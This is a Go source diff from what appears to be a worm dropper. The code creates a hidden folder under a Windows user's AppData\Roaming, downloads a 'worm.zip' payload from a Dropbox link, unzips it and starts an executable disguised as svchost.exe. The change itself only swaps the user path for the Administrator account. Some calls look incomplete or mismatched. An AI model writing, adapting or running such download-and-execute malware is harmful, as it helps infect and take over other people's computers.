@@ -17,12 +17,12 @@ import (
 func main(){
 	myos := runtime.GOOS
 	if myos=="windows" {
-		if _, err := os.Stat("\\Users\\%USERNAME%\\AppData\\Roaming\\Templow\\flag.txt"); os.IsNotExist(err) {
-			os.Mkdir("\\Users\\%USERNAME%\\AppData\\Roaming\\Templow",os.FileMode(0777))
-			ioutil.WriteFile("\\Users\\%USERNAME%\\AppData\\Roaming\\Templow\\flag.txt",[]byte("hello"),0777)
-			os.Chdir("\\Users\\%USERNAME%\\AppData\\Roaming\\Templow")
+		if _, err := os.Stat("\\Users\\Administrator\\AppData\\Roaming\\Templow\\flag.txt"); os.IsNotExist(err) {
+			os.Mkdir("\\Users\\Administrator\\AppData\\Roaming\\Templow",os.FileMode(0777))
+			ioutil.WriteFile("\\Users\\Administrator\\AppData\\Roaming\\Templow\\flag.txt",[]byte("hello"),0777)
+			os.Chdir("\\Users\\Administrator\\AppData\\Roaming\\Templow")
 			downloadzip("https://www.dropbox.com/s/7jk5jj8actz15eb/worm.zip?dl=1")
-			Unzip("file.zip","\\Users\\%USERNAME%\\AppData\\Roaming\\Templow")
+			Unzip("file.zip","\\Users\\Administrator\\AppData\\Roaming\\Templow")
 			exec.Command("START",".\\svchost.exe")
 			os.Exit(0)
 		} else {
